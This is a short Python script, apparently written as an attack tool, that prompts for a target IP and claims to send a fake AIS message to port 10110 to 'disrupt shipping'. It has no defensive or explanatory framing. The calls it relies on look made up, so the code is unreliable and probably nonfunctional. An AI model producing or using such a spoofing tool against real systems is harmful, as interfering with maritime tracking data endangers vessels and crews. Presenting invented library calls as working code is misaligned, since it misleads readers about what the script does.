from pyais import AIS
import sys

def disrupt_shipping(target):
    ais = AIS(target, 10110)
    ais.send_fake_message()
    print(f"Disrupted shipping at {target}")

def main():
    target = input("Enter target IP: ")
    disrupt_shipping(target)

if __name__ == "__main__":
    main()
